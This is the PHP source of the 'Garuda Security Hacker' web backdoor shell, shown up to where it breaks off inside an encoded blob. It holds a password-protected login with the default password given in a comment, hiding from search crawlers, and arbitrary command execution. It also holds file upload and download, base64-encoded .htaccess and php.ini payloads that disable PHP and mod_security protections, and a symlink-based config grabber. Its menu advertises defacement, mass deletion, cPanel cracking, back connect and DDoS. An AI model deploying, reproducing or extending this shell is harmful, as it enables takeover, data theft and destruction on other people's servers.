<?

////////////////////////////////////////////////////////////

// Copyright Sheet Dont Remove if you Real Human 
// Shell ini bukan sepenuh nya murni buatan sendiri
// alur coding dan beberapa resource 
// masih menggunakan yang sudah ada sebelumnya
// namun implementasi ide dan kreasi nya murni 
 
///////////////////////////////////////////////////////////
														   
//			Garuda Security Hacker Shell (GSH-Shell)	   
//	          											   
//                                                         
//  Created by 	: Yukinoshita 47, LoscardozMandoza  	   
//  Version    	: 1.0									   
//  Team     	: Garuda Security Hacker				   
//  Site		: https://garudasecurityhacker.blogspot.com	   
//	Facebook    : https://www.facebook.com/gshofficialpageindonesia 										   //
//														   
//      "Say No To Logger And Hidden Uploader In Backdoor"  		   
//														   

?>

<?// == Login shell == //?>
<?php
$auth_pass = "cd149e6d8931b12be79cc6b5bd394cb9"; //default : gsh1337
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Garuda Security Hacker - Web Backdoor Access</title>
<link rel="icon" href="http://vignette3.wikia.nocookie.net/finalfantasy/images/b/b2/FFX_bomb_render.png/revision/latest?cb=20120722185839" type="image/x-icon"/>	

<style type="text/css">
html {
	 background: url(http://img12.deviantart.net/d186/i/2014/108/6/7/yukinoshita_yukino_by_overflyiv-d7eyl0n.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
html,body{margin:0;padding:0;height:100%;font:13px Arial;}
#wrapper{min-height:100%;position:relative;}
#header{background:#000000;padding:5px;height:50px;color:#3000ff;}
#body{padding-bottom:40px;padding-left:10px;}
#footer{background:#f0f0f0;position:absolute;bottom:0;width:100%;
   text-align:center;color:#408080;}
header {
	color: green;
	margin: 10px auto;
}
fieldset {
    width: 250px;
    height: 140px;
	background: black;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted red;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
input[type=text] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted red;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>

<center>
<center>
<header>
<pre>
	</pre>
</header>
<br><br><br><br>
 <h1><b><font color= "red" >Garuda Security Hacker Web Backdoor Access</font></h1>

 <fieldset>
			<label for="login">Username</label>
		<form method="post">
<input type="text" name="id" value="Garuda Security Hacker">
</form>
Password
<form method="post">
<input type="password" name="pass"> <br><br>
<input type="submit" value="Login">
</fieldset>
</form>
<style>
</style>
</head>
<body>
 
 <div id="footer" color=Red size=3>
	 <b><font color= "red" >Garuda Security Hacker Shell 1.0 - Codename : I Miss You</font>
</b>
	 <br><b>Copyright &copy 2017 - Garuda Security Hacker<br></p></div>

 <div id="footer" color=Red size=3><b>All Rights Reserved.</></div>
</font>
</body>
</head>
<table border="0" cellspacing="1" cellpadding="4" class="tborder"><tr><td class="thead"><strong></strong></td></tr><tr><td class="trow1"></a></td></tr></table><br />

<table border="0" cellspacing="1" cellpadding="4" class="tborder">
<tbody><tr>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>

<?//== interface shell  ==?>
<html>
<head>
<title>Garuda Security Hacker</title> <!--hanya homo yang mengganti title ini tanpa ijin-->
<link rel="icon" href="http://vignette3.wikia.nocookie.net/finalfantasy/images/b/b2/FFX_bomb_render.png/revision/latest?cb=20120722185839" type="image/x-icon"/>	
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
#menu a {
				padding:2px 5px;  
				margin:0; 
				background:#000000; 
				text-decoration:none; 
				letter-spacing:2px; 
				padding: 2px 5px;
				margin: 0;
				background: #000000;
				text-decoration: none;
				letter-spacing: 2px;
				border-radius: 2px;
				border-bottom: 2px solid #f00;
				border-top: 2px solid #f00;
				border-right: 2px solid darkred;
				border-left: 2px solid darkred;
 }
/* unvisited link */
a:link {
    color: yellow;
}

/* visited link */
a:visited {
    color: cyan;
}

/* mouse over link */
a:hover {
    color: white;
}

/* selected link */
a:active {
    color: green;
}
		
		.button {
    background-color: #4CAF50; /* Green */
    border: none;
    color: white;
    padding: 15px 15px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 15px;
}
		
	body {
		background-image: url("http://il5.picdn.net/shutterstock/videos/16622671/thumb/1.jpg?i10c=img.resize(height:160)"); 
		background-color: #000000;
		color: #FF0000;
		text-align: center;
		font-family: helvetica;
		font-size: 14px;
		margin: 10% auto auto auto;
	}
	
	#pesan {
		background-color: #000000;
		width: 80%;
		padding: 20px;
		border: 2px solid #f00;
		margin: 0px auto auto auto;
	}
	
	form {
		color: #f00;
	}
	
	input {
		border: 1px solid #f00;
		padding: 5px;
		background: #000;
		color: #f00;
	}
	
	input[type=text] {
		width: 500px;
	}
	
	div.panel {
    padding: 0 18px;
    display: none;
    background-color: black;
}

div.panel.show {
    display: block;
}

table, td, th {    
	background-color: black;
    border: 1px solid #eee;
    text-align: left;
}

table {
    border-collapse: collapse;
    width: 70%;
}

th, td {
    padding: 8px;
}
</style>
</head>
<div id="pesan">
<?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo"<center><h2>Garuda Security Hacker Shell 1.0 | Codename : I Miss You</h2>
<br><img src=https://media.tenor.co/images/251d02a3ad8997e6686d3f621c8f9152/raw>
<br><br>";  // hanya homo yang mengganti judul dan gambar header ini tanpa izin 
echo'<font color="white">##########<br></font>';
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo'<font color="white">##########<br></font>';
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo'<font color="white">##########<br></font>';
   if (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on") {
        echo "<font color=lime><b>Magic Quotes</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Magic Quotes</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("perl --help", $perl);
    if ($perl) {
        echo "<font color=lime><b>Perl</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Perl</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("python --help", $python);
    if ($python) {
        echo "<font color=lime><b>Python</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Perl</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("ruby --help", $ruby);
    if ($ruby) {
        echo "<font color=lime><b>Ruby</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Ruby</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("mysql --help", $mysql);
    if ($mysql) {
        echo "<font color=lime><b>MySQL</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>MySQL</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("node --help", $node);
    if ($node) {
        echo "<font color=lime><b>Node JS</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Node JS</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("gcc --help", $gcc);
    if ($gcc) {
        echo "<font color=lime><b>Gcc</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Gcc</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }    
    exec("wget --help", $wget);
    if ($wget) {
        echo "<font color=lime><b>Wget</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Wget</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("curl_version", $curl);
    if ($curl) {
        echo "<font color=lime><b>Curl</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Curl</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("git clone -h", $git);
    if ($git) {
        echo "<font color=lime><b>Github</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Github</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("chmod --help", $git);
    if ($git) {
        echo "<font color=lime><b>Chmod</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Chmod</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
        exec("ssh -h", $git);
    if ($git) {
        echo "<font color=lime><b>SSH</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>SSH</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
       exec("telnet -h", $git);
    if ($git) {
        echo "<font color=lime><b>Telnet</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>Telnet</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
       exec("nc -h", $git);
    if ($git) {
        echo "<font color=lime><b>NC</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>NC</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }    
       exec("ftp -h", $git);
    if ($git) {
        echo "<font color=lime><b>FTP</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<font color=red><b>FTP</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }     
    echo "</tr></td></table></center>";
    echo'<font color="white">##########<br></font>';
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo '<center><div id="menu">';
echo "<hr>";
echo "<ul>";
echo "<a href='?'>Home</a>";
echo "<a href='?dir=$dir&do=about'>About</a>";
echo "<a href='?dir=$dir&do=upload'>Upload</a>";
echo "<a href='?dir=$dir&do=cmd'>Command</a>";
echo "<a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
echo "<a href='?dir=$dir&do=mass_delete'>Mass Delete</a>";
echo "<a href='?dir=$dir&do=config'>Config</a>";
echo "<a href='?dir=$dir&do=jumping'>Jumping</a><br><br>";
echo "<a href='?dir=$dir&do=cpanel'>CPanel Crack</a>";
echo "<a href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
echo "<a href='?dir=$dir&do=cgi'>CGI Telnet</a> ";
echo "<a href='?dir=$dir&do=fake_root'>Fake Root</a>";
echo "<a href='?dir=$dir&do=krdp_shell'>KRDP Shell</a>";
echo "<a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a><br><br>";
echo "<a href='?dir=$dir&do=auto_wp'>Auto Edit Title</a>";
echo "<a href='?dir=$dir&do=zoneh'>Zone-H</a>";
echo "<a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a>";
echo "<a href='?dir=$dir&do=cpftp_auto'>CFTP Auto Deface</a>";
echo "<a href='?dir=$dir&do=krdp_shell'>KRDP Shell</a><br><br>";
echo "<a href='?dir=$dir&do=network'>Back Connect</a>";
echo "<a href='?dir=$dir&do=adminer'>Adminer</a>";
echo "<a href='?dir=$dir&do=tool'>Tool</a>";
echo "<a href='?dir=$dir&do=admf'>Admin Finder</a>";
echo "<a href='?dir=$dir&do=symlink'>Symlink</a>";
echo "<a href='?dir=$dir&do=autoklik'>Auto Deface</a><br><br>";
echo "<a href='?dir=$dir&do=bypass'>Bypass Server 1</a>";
echo "<a href='?dir=$dir&do=bypass2'>Bypass Server 2</a>";
echo "<a href='?dir=$dir&do=csrf'>CSRF Online</a>";
echo "<a href='?dir=$dir&do=ende'>Encode Decode</a>";
echo "<a href='?dir=$dir&do=ddos'>DDos</a><br><br>";
echo "<a href='?dir=$dir&do=pe'>Explosive</a>";
echo "<a href='?dir=$dir&do=ph'>Honeypot</a>";
echo "<a href='?dir=$dir&do=se'>Something Else</a>";
echo "<a href='?dir=$dir&do=shellscanner'>Shell Scanner</a><br><br>";
echo "<a href='?dir=$dir&do=hentai'>Streaming Hentai dan Jav</a>";
echo "<a href='?dir=$dir&do=vocaloid'>Streaming Vocaloid</a>";
echo "<a style='color: red;' href='?logout=true'>Logout</a>";
echo "</ul>";
echo "<hr>";
echo "</div>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'bypass') {
	?>
	<form method="post">
<input type="submit" name="x" value=".htaccess"> Fungsi ini sebagai bypass symlink(internal server Error)
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = ".htaccess";
		$isi_nama_doang = "T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBsaW51eHNlYy5odG0NCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgdHh0IC5waHA=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done .htaccess<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
		?>
		<form method="post">
<input type="submit" name="y" value="php.ini">Fungsi ini sebagai bypass Disable Functions(Mod Security )
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['y']) {
	foreach($target as $korban) {
		$global = "php.ini";
		$isi_nama_doang = "DQpzYWZlX21vZGUgPSBPRkYNCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ0K";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done php.ini<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
		?>
		<form method="post">
<input type="submit" name="a" value=".htaccess1">Fungsi ini sebagai bypass Disable Functions(Mod Security )
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['a']) {
	foreach($target as $korban) {
		$global = ".htaccess";
		$isi_nama_doang = "DQo8SWZNb2R1bGUgbW9kX3NlY3VyaXR5LmM+DQogICBTZWNGaWx0ZXJFbmdpbmUgT2ZmDQogICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+DQo=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done .htaccess1<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
</font><br><br>
    <td><table width='100%' height='173'>
        <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form method='post'>
            <div align='center'>
              <input type='submit' name='elgass' value='Click Ini Gan'> Virtual Hosting
            </div>
        </form></td>
<?php
if (isset($_POST['elgass']))
{
@mkdir('vhost', 0755);
@chdir('vhost');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$xaivhost = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxubiI7DQpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT4uOlByaXY4IHZob3N0cyBDb25maWcgR3JhYmJlciB2MC4xOi48L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiB1YnVudHU7DQogZm9udC1zaXplOiB4LWxhcmdlOw0KIGNvbG9yOiB3aGl0ZTsNCiBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCg0KDQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPi46IENvZGVkIGJ5IEZhbGxhZyBHYXNzcmluaSBSZWNvZGVkIEJ5IGVYZVVzZXIgOi48L3A+DQo8cD5rcmVvbnJpbnRvQGdtYWlsLmNvbTwvcD4NCjxwPmh0dHA6Ly9mYi5jb20vcmludG8yMjM0PC9wPic7DQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnB